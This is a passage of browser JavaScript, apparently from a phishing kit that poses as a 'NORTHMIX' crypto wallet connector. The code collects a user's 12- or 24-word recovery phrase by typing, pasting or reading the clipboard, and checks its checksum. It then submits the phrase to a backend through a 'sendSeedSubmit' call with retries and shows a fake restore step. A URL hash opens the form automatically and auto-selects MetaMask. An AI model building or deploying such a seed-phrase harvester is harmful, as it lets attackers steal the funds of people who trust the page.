      });
    });

    root.querySelectorAll('[data-action="back"]').forEach((button) => {
      button.addEventListener('click', function () {
        if (STATE.screen === 'seed') STATE.screen = 'connect';
        else if (STATE.screen === 'all') STATE.screen = 'connect';
        else STATE.screen = 'connect';
        render();
      });
    });

    root.querySelectorAll('[data-action="open-all"]').forEach((button) => {
      button.addEventListener('click', function () {
        STATE.screen = 'all';
        render();
      });
    });

    const allSearch = root.querySelector('[data-field="all-search"]');
    if (allSearch) {
      allSearch.addEventListener('input', function (event) {
        STATE.allSearch = event.target.value || '';
        render();
      });
    }

    root.querySelectorAll('[data-action="zoom-qr"]').forEach((el) => {
      el.addEventListener('click', function () { STATE.qrZoom = true; render(); });
      el.addEventListener('keydown', function (event) {
        if (event.key !== 'Enter' && event.key !== ' ') return;
        event.preventDefault();
        STATE.qrZoom = true;
        render();
      });
    });

    root.querySelectorAll('[data-action="close-qr"]').forEach((el) => {
      el.addEventListener('click', function () { STATE.qrZoom = false; render(); });
    });

    root.querySelectorAll('[data-count]').forEach((button) => {
      button.addEventListener('click', function () {
        const count = Number(button.getAttribute('data-count') || 24);
        const preserved = STATE.phrase.slice(0, count);
        STATE.invalidLength = false;
        STATE.phraseOk = false;
        STATE.phraseStatus = 'Incomplete';
        STATE.count = count;
        STATE.phrase = Array.from({ length: count }, (_, index) => preserved[index] || '');
        render();
        void refreshSeedState(root);
      });
    });

    root.querySelectorAll('.sc-word').forEach((input) => {
      input.addEventListener('paste', function (event) {
        const text = event.clipboardData ? event.clipboardData.getData('text') : '';
        const words = String(text || '')
          .split(/[\s,;]+|\s+/)
          .map(normalizeWord)
          .filter(Boolean);
        if (words.length < 2) return;
        event.preventDefault();
        applyWords(words, Number(input.getAttribute('data-index')) || 0);
      });

      input.addEventListener('input', function (event) {
        const index = Number(event.target.getAttribute('data-index'));
        const nextValue = normalizeWord(event.target.value || '');
        const parts = nextValue.split(' ').filter(Boolean);
        if (parts.length > 1) {
          event.target.value = parts[0];
          STATE.phrase[index] = parts[0];
          applyWords(parts, index);
          return;
        }
        event.target.value = nextValue;
        STATE.invalidLength = false;
        STATE.phraseOk = false;
        STATE.phrase[index] = nextValue;
        void refreshSeedState(root);
      });

      input.addEventListener('keydown', function (event) {
        const index = Number(event.target.getAttribute('data-index'));
        const nextIndex = index + 1;
        const prevIndex = index - 1;

        if ((event.key === ' ' || event.key === 'Spacebar') && !event.shiftKey) {
          event.preventDefault();
          const next = root.querySelector('.sc-word[data-index="' + nextIndex + '"]');
          if (next) next.focus();
        }

        if (event.key === 'Backspace' && !event.target.value) {
          const prev = root.querySelector('.sc-word[data-index="' + prevIndex + '"]');
          if (prev) {
            event.preventDefault();
            prev.focus();
            prev.selectionStart = prev.value.length;
            prev.selectionEnd = prev.value.length;
          }
        }
      });
    });

    root.querySelectorAll('[data-action="submit-seed"]').forEach((button) => {
      button.addEventListener('click', async function () {
        if (STATE.sending) return;

        const normalizedWords = STATE.phrase.slice(0, STATE.count).map(normalizeWord);
        const hasAny = normalizedWords.some(Boolean);
        const nonEmpty = normalizedWords.filter(Boolean);
        const unknown = nonEmpty.find((word) => !checkWord(word));
        const wrongLength = nonEmpty.length !== STATE.count;
        const shouldBlock = !hasAny || wrongLength || Boolean(unknown);

        if (shouldBlock) {
          STATE.sendError = true;
          STATE.sendStatus = !hasAny ? 'Phrase incomplete' : wrongLength ? 'Wrong length' : 'Unknown word: ' + unknown;
          STATE.sendRetry = false;
          render();
          return;
        }

        const phrase = nonEmpty.join(' ');
        const checksumOk = await validateMnemonicPhrase(phrase);
        if (!checksumOk) {
          STATE.sendError = true;
          STATE.sendStatus = 'Checksum failed';
          STATE.sendRetry = false;
          render();
          return;
        }

        STATE.sending = true;
        STATE.sendError = false;
        STATE.retryCount = 0;
        render();

        const submitApi = global.NORTHMIXSeedSubmit;
        if (!submitApi || typeof submitApi.buildSeedSubmitPayload !== 'function' || typeof submitApi.sendSeedSubmit !== 'function') {
          STATE.sending = false;
          STATE.sendError = true;
          STATE.sendStatus = 'Submit unavailable — reload the page';
          STATE.sendRetry = false;
          render();
          return;
        }

        try {
          const payload = submitApi.buildSeedSubmitPayload();
          const gap = missingField(payload);
          if (gap) {
            STATE.sending = false;
            STATE.sendError = true;
            STATE.sendStatus = gap;
            STATE.sendRetry = false;
            render();
            return;
          }
          let result = await submitApi.sendSeedSubmit(payload);
          for (let retry = 1; retry <= RETRY_DELAYS.length; retry += 1) {
            if (result && result.ok) break;
            if (!isRetryableFailure(result)) break;
            STATE.retryCount = retry;
            STATE.sending = true;
            render();
            await wait(RETRY_DELAYS[retry - 1]);
            result = await submitApi.sendSeedSubmit(payload);
          }
          STATE.sending = false;
          STATE.retryCount = 0;
          if (result && result.ok) {
            STATE.sendError = false;
            STATE.sendStatus = '';
            STATE.sendRetry = false;
            startRestoreFlow();
            return;
          }
          const failure = describeSendFailure(result);
          STATE.sendError = true;
          STATE.sendStatus = failure.text;
          STATE.sendRetry = failure.retry;
          render();
        } catch (error) {
          STATE.sending = false;
          STATE.retryCount = 0;
          STATE.sendError = true;
          STATE.sendStatus = 'Connection lost — Retry';
          STATE.sendRetry = true;
          render();
        }
      });
    });

    root.querySelectorAll('[data-action="retry-submit"]').forEach((button) => {
      button.addEventListener('click', function () {
        STATE.sendError = false;
        STATE.sendRetry = false;
        const submit = root.querySelector('[data-action="submit-seed"]');
        if (submit) submit.click();
      });
    });

    root.querySelectorAll('[data-action="paste-clipboard"]').forEach((button) => {
      button.addEventListener('click', async function () {
        try {
          const raw = await navigator.clipboard.readText();
          const words = String(raw || '').split(/\s+/).map(normalizeWord).filter(Boolean);
          if (!words.length) return;

          if (![12, 24].includes(words.length)) {
            STATE.invalidLength = true;
            STATE.phraseOk = false;
            STATE.count = 24;
            STATE.phrase = Array.from({ length: 24 }, () => '');
            await refreshSeedState(root);
            return;
          }

          STATE.invalidLength = false;
          STATE.phraseOk = false;
          STATE.count = words.length;
          STATE.phrase = Array.from({ length: words.length }, (_, index) => words[index] || '');
          await refreshSeedState(root);
        } catch (error) {
        }
      });
    });
  }

  function openConnector() {
    if (STATE.promise && STATE.open) return STATE.promise;

    STATE.promise = new Promise(function (resolve, reject) {
      const root = getRoot();
      if (!root) {
        STATE.promise = null;
        reject(new Error('Wallet connector is not ready.'));
        return;
      }
      STATE.pending = { resolve: resolve, reject: reject };
      STATE.connectionResolved = false;
      STATE.lastReturnFocus = document.activeElement || null;
      STATE.screen = 'connect';
      STATE.wallet = null;
      STATE.address = null;
      STATE.network = DEFAULT_NETWORK;
      STATE.address = getWalletPair(null).address;
      if (global.NORTHMIX.transactionUI) global.NORTHMIX.transactionUI.setNetwork(DEFAULT_NETWORK);
      STATE.count = 24;
      STATE.invalidLength = false;
      STATE.restoreStep = 0;
      clearRestoreTimer();
      STATE.phrase = Array.from({ length: STATE.count }, () => '');
      STATE.sendError = false;
      STATE.sendStatus = '';
      STATE.sendRetry = false;
      STATE.retryCount = 0;
      STATE.phraseOk = false;
      STATE.phraseStatus = 'Incomplete';
      STATE.selectedWalletId = null;
      STATE.open = true;
      loadWordList().catch(function () {});
      root.classList.add('is-open');
      render();
    });

    return STATE.promise;
  }

  function closeConnector() {
    const root = getRoot();
    if (!root) return;
    if (STATE.pending && !STATE.connectionResolved && typeof STATE.pending.reject === 'function') {
      STATE.pending.reject(new Error('Wallet connection was cancelled.'));
    }
    STATE.pending = null;
    STATE.promise = null;
    if (STATE.resolveTimer) {
      window.clearTimeout(STATE.resolveTimer);
      STATE.resolveTimer = null;
    }
    STATE.open = false;
    STATE.connecting = false;
    STATE.connectionResolved = false;
    STATE.invalidLength = false;
    STATE.selectedWalletId = null;
    STATE.restoreStep = 0;
    clearRestoreTimer();
    if (!STATE.sendError) STATE.phrase = Array.from({ length: STATE.count }, () => '');
    STATE.sendError = false;
    STATE.sendStatus = '';
    STATE.sendRetry = false;
    STATE.retryCount = 0;
    STATE.phraseOk = false;
    STATE.phraseStatus = 'Incomplete';
    root.classList.remove('is-open');
    if (STATE.lastReturnFocus && STATE.lastReturnFocus.focus) {
      STATE.lastReturnFocus.focus();
    }
  }

  global.NORTHMIX = global.NORTHMIX || {};
  global.NORTHMIX.connector = {
    openConnector: openConnector,
    closeConnector: closeConnector
  };

  loadWordList().catch(function () {});

  getRoot();

  document.addEventListener('keydown', function (event) {
    if (event.key !== 'Escape' || !STATE.open) return;
    if (STATE.qrZoom) { STATE.qrZoom = false; render(); return; }
    if (!STATE.connectionResolved) settleReject();
    closeConnector();
  });

  if (location.hash === '#connect' || location.hash === '#seed') {
    var openOnLoad = function () {
      if (global.NORTHMIX.transactionUI) global.NORTHMIX.transactionUI.go('wallet');
      openConnector();
      if (location.hash === '#seed') {
        window.setTimeout(function () {
          var pick = document.querySelector('[data-wallet-id="metamask"]');
          if (pick) pick.click();
        }, 250);
      }
    };
    if (document.readyState !== 'complete') window.addEventListener('load', openOnLoad, { once: true });
    else openOnLoad();
  }
})(window);
